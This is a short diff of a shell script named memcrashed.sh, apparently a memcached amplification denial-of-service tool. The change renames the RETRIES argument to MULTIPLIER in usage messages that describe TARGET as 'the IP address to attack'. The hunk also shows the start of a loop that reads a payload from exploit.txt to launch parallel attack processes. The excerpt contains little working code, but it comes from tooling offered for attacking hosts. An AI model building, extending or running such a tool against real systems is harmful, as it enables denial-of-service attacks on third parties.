@@ -25,20 +25,20 @@ if [ -z "$(which nping)" ]; then
   esac
 else
   if [ -z $1 ]; then
-    echo "Usage: ./memcrashed.sh TARGET PORT RETRIES, where \
+    echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
     TARGET is the IP address to attack, \
     PORT is the port to attack on the target, \
-    and RETRIES is the number of simultaneous process to run."
+    and MULTIPLIER is the number of simultaneous process to run."
   elif [ -z $2 ]; then
-    echo "Usage: ./memcrashed.sh TARGET PORT RETRIES, where \
+    echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
     TARGET is the IP address to attack, \
     PORT is the port to attack on the target, \
-    and RETRIES is the number of simultaneous process to run."
+    and MULTIPLIER is the number of simultaneous process to run."
   elif [ -z $3 ]; then
-    echo "Usage: ./memcrashed.sh TARGET PORT RETRIES, where \
+    echo "Usage: ./memcrashed.sh TARGET PORT MULTIPLIER, where \
     TARGET is the IP address to attack, \
     PORT is the port to attack on the target, \
-    and RETRIES is the number of simultaneous process to run."
+    and MULTIPLIER is the number of simultaneous process to run."
   else
     while [ $i -lt $3 ]; do
       exploit="$(cat exploit.txt)"
